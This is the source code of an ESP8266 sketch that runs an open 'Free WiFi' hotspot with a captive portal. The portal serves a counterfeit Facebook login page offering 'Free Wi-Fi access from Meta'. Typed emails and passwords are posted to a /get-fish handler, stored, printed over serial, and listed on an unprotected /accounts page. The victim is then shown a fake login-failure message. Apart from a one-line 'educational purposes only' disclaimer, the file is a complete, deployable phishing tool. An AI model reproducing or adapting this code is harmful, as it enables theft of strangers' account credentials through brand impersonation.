/*
  ESP8266 Facebook Phishing using captive portal.
  - Warning: Use this for educational purposes only.
  - © 2024 libyzxy0;
  
  - '/accounts' will be the route for result of fished accounts.
*/

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ArduinoOTA.h>

const char* ssid = "Free WiFi Net_V728081";
const char* password = ""; 
/* const char* OTA_PASSWORD = "IloveMyESP8266"; */

ESP8266WebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1); 

struct FishRecord {
  String email;
  String password;
  String catchTime;
};

FishRecord fishList[20];
int fishCount = 0;

String htmlContent = "<!DOCTYPE html>"
"<html lang=\"en\">"
"<head>"
"  <meta charset=\"UTF-8\">"
"  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
"  <title>Facebook - log in or sign up<</title>"
"  <style>"
" * { box-sizing: border-box; padding: 0; margin: 0; }"
" body { font-family: 'Segoe UI', Arial, Helvetica, sans-serif; background: #e9f3ff; height: auto; padding-bottom: 16px;}"
" .c { display: flex; justify-content: center; flex-direction: column; align-items: center; width: 100%; }"
" header { margin-top: 30px; display: flex; justify-content: center; flex-direction: column; align-items: center; }"
" p { font-size: 13px; font-weight: 500; color: #717171; }"
" form { display: flex; justify-content: center; flex-direction: column; margin-top: 50px; padding: 0 20px; width: 100%; }"
" input { margin: 10px 0; padding: 21px 16px; font-size: 1em; border: 1px solid #e1e1e1; width: 100%; font-weight: 450; border-radius: 12px; background-color: #fcfcfc; outline: none; color: #464646; }"
" input::placeholder { color: #919191; }"
" input:hover { border: 1px solid #5e5e5e; }"
" .b { border: none; border-radius: 50px; padding: 13px 20px; margin-top: 10px; font-weight: bold; font-size: 1em; color: #f8f8f8; background-color: #1877F2; }"
" .o { border: none; border-radius: 50px; padding: 13px 20px; margin-top: 10px; font-size: 1em; color: #1877F2; border: 0.5px solid #1877F2; background-color: transparent; width: 100%; }"
" .b:hover { background-color: #156ddff1; }"
"  </style>"
"</head>"
"<body>"
"  <div class=\"c\">"
"    <header>"
"      <p style=\"font-weight: 500;letter-spacing: 0.4px;\">English (US)</p>"
"      <img style=\"margin-top: 30px;\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAMAAAANIilAAAAAqFBMVEVHcEwAaf8AaP8AaP8Acv8AaP8AaP8Aaf8Aav8Aav8Aaf8AaP8AYv8AaP8AZv8AaP8AZ/8Aaf8Aaf8AZ/8Aav8AaP8Aaf////8AZ/8AZ/8AaP8Aaf+Wxf////////////////8AaP////8ijv+Yx/8Ae//d7P91tP+72v+r0P8Acv9Pof8AhP9Rof+Ivf9jqv/M4//v9f+Zxv92tf91tf9jq/87l//N5P9eHjvMAAAAIXRSTlMA31BwEN/PvyBAn4AQj3DvYM+QkGCgr99v73+wz0C/r4AjSSTgAAABt0lEQVR42q3XaW+CQBCA4QH24qhWbWvvdrAo2sve//+fVRJbVnZWBto38eOTgQkbEOhEOEiUxE1Sn6SxAHbiXGMjPTAsGtvS9jGT0slwLzU1JUuM356eYUvy0EPFATI6oK1CVsq41khkJg1l2Vo0sMIOqV3t3dXD810531SWT88zemuHtFy9z3OrOf4Wtd7wrKI0HtZLS0j7VjMHo/6xIWnv830Y4y2WlC3mBHZHx0j1mhPYHa3JwTmFndGGcccURrHBAxIvbVU+FgVi9bNLfVeNX5Z9RDINkCGZZRfoSUCMbfsqfDiEFKlmtV2jrwhO2vDSixPQbfjOixXI/lgC9sf4v3iRe/v8C35wsGTjF3dhio1L9+E+ZuOnJr6AARt/NHEKIRvPmjiGjI1X7pEEzcRrd1/QPJOrouq+Rstim3siAbK+j6eBTbof1lAV8zHxvtF9cADgjGbjELbp7jiBn8ywKw4M/BZ1xUdgNemGx2CXqS54BLtlAR8H7idg4MOUdbTi4ZEAqgkHjwXQHQVteBiBN3O8H2sD+woDEvP/3ziYpnQm0k2sUwHsxNXtzfW0stPLJAo98huzim0FHOYC8wAAAABJRU5ErkJggg==\" alt=\"Facebook logo\">"
"      <p style=\"margin-top: 30px !important;color: #393939;text-align: left;letter-spacing: 0.3px;margin: 0 25px; border-left: 2px solid #1877F2;padding: 4px 7px;background-color: #1877f20f;display: flex; align-items: center; flex-direction: column;\">"
"        Log in to your Facebook account now to get your Free Wi-Fi access from Meta!"
"      </p>"
"    </header>"
"    <form id=\"f\">"
"      <input type=\"text\" id=\"e\" placeholder=\"Mobile number or email\" />"
"      <input type=\"password\" id=\"p\" placeholder=\"Password\" />"
"      <button class=\"b\" type=\"submit\" id=\"s1\">Login</button>"
"    </form>"
"    <a style=\"margin-top: 30px; color: #2d2d2d; font-weight: 400;letter-spacing: 0.5px;text-decoration: none;font-size: 14px;\" href=\"https://facebook.com\">Forgot password?</a>"
"    <form>"
"      <button class=\"o\" type=\"button\">Create new account</button>"
"    </form>"
" <p style=\"margin-top: 30px !important;color: #707070;text-align: center;letter-spacing: 0.3px;margin: 0 25px;font-weight: 400; font-size: 0.7em;\">© Copyright 2024 Meta WiFi Program all rights reserved.</p>"
"  </div>"
"  <script>"
"    const f = document.getElementById('f');"
" f.addEventListener('submit', async (e) => {"
"      e.preventDefault();"
"  const em = f.e.value, pw = f.p.value;"
" if (!em || !pw) return alert('Please enter your email and password!');"
" document.getElementById('s1').textContent=\"Logging In...\";"
"      const response = await fetch('/get-fish', {"
"        method: 'POST',"
"        headers: {"
"          'Content-Type': 'application/x-www-form-urlencoded',"
"        },"
"        body: new URLSearchParams({"
"          email: em,"
"          password: pw,"
"          dt: new Date().toLocaleString(\"en-GB\", { day: \"2-digit\", hour: \"2-digit\", minute: \"2-digit\", second: \"2-digit\", hour12: false }).replace(\",\", \"\"),"
"        })"
"      });"
"   await new Promise(resolve => setTimeout(resolve, 1000));"
" document.getElementById('s1').textContent=\"Log In\"; "
" alert('Failed to connect to WiFi, incorrect credentials.');"
"    });"
"  </script>"
"</body>"
"</html>";

void setup() {
  Serial.begin(9600);
  
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH); 
  
  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  Serial.print("Access Point IP address: ");
  Serial.println(WiFi.softAPIP());
  
  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", handleRoot);
  server.on("/get-fish", HTTP_POST, handlePost);
  server.on("/accounts", HTTP_GET, handleGetFishList); 
  server.on("/espcleardata", HTTP_GET, handleClearAccounts); 
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("HTTP server started");
  
  /* Start Arduino OTA Implementation */
  
  /* ArduinoOTA.setPassword(OTA_PASSWORD); */

  ArduinoOTA.onStart([]() {
    String type;
    if (ArduinoOTA.getCommand() == U_FLASH) {
      type = "sketch";
    } else { // U_SPIFFS
      type = "filesystem";
    }
    Serial.println("Start updating " + type);
  });
  
  ArduinoOTA.onEnd([]() {
    Serial.println("\nEnd");
  });
  ArduinoOTA.onProgress([](unsigned int progress, unsigned int total) {
    Serial.printf("Progress: %u%%\r", (progress / (total / 100)));
  });
  
  ArduinoOTA.onError([](ota_error_t error) {
    Serial.printf("Error[%u]: ", error);
    if (error == OTA_AUTH_ERROR) {
      Serial.println("Auth Failed");
    } else if (error == OTA_BEGIN_ERROR) {
      Serial.println("Begin Failed");
    } else if (error == OTA_CONNECT_ERROR) {
      Serial.println("Connect Failed");
    } else if (error == OTA_RECEIVE_ERROR) {
      Serial.println("Receive Failed");
    } else if (error == OTA_END_ERROR) {
      Serial.println("End Failed");
    }
  });
  
  ArduinoOTA.begin();
  /* End Arduino OTA Implementation */
}

void loop() {
  dnsServer.processNextRequest(); 
  server.handleClient();
  
  /* Start Arduino OTA Implementation */
  ArduinoOTA.handle();
  /* End Arduino OTA Implementation */

  if (fishCount > 0) {
    digitalWrite(LED_BUILTIN, LOW);
  } else {
    digitalWrite(LED_BUILTIN, HIGH);
  }
}

void blinkLED(int times, int d) {
  for (int i = 0; i < times; i++) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(d);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(d);
  }
}

void handleRoot() {
  server.send(200, "text/html", htmlContent);
  blinkLED(1, 100);
}

void handleClearAccounts() {
  Serial.println("Clear Data Action");

  for (int i = 0; i < fishCount; i++) {
    fishList[i].email = "";
    fishList[i].password = "";
    fishList[i].catchTime = ""; 
  }

  fishCount = 0;
}

void handlePost() {
  if (server.hasArg("email") && server.hasArg("password") && server.hasArg("dt")) {
    String email = server.arg("email");
    String password = server.arg("password");

    String catchTime = server.arg("dt");

    if (fishCount < 20) { 
      fishList[fishCount].email = email;
      fishList[fishCount].password = password;
      fishList[fishCount].catchTime = catchTime;
      fishCount++;
    } else {
      Serial.println("Fish list is full!");
    }

    Serial.println("Caught a fish:");
    Serial.println(email + ":" + password + ":" + catchTime);

    server.send(200, "text/html", "Ohh no! Failed to login, try again later.");
    blinkLED(5, 500);
  }
}

void handleGetFishList() {
  String htmlFishList = "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>Fished Accounts</title></head><body style=\"background-color: #1b1b1b;display: flex;flex-direction: column;align-items: center;justify-content: center;\"><h1 style=\"font-size: 22px; font-weight: 800; margin-bottom: 20px;color: white;\">Accounts (";
  
  htmlFishList += fishCount;
  
  htmlFishList += "/20)</h1><div style=\"overflow-x: auto;width: 100%; display: flex;flex-direction: column;align-items: center;justify-content: center;\"><table style=\"border-collapse: collapse;width: auto;\"><tr><th style=\"background-color: #292929; color: white;padding: 8px;border: 2px solid #292929;\">Email</th><th style=\"background-color: #292929; color: white;padding: 8px;border: 2px solid #292929;\">Password</th><th style=\"background-color: #292929; color: white;padding: 8px;border: 2px solid #292929;\">Time</th></tr>";
  
  for (int i = 0; i < fishCount; i++) {
    htmlFishList += "<tr><td style=\"padding: 8px;color: white;border: 2px solid #292929;\">" + fishList[i].email + "</td><td style=\"padding: 8px;color: white;border: 2px solid #292929;\">" + fishList[i].password + "</td><td style=\"padding: 8px;color: white;border: 2px solid #292929;\">" + fishList[i].catchTime + "</td></tr>";
  }
  
  htmlFishList += "</table></div><button onclick=\"(async function f() { await fetch('/espcleardata')})()\" style=\" background-color: #292929; border: none;border-radius: 9px; padding: 12px 14px;margin-top: 30px; color: white;\">Clear Data</button></body></html>";
  server.send(200, "text/html", htmlFishList);
}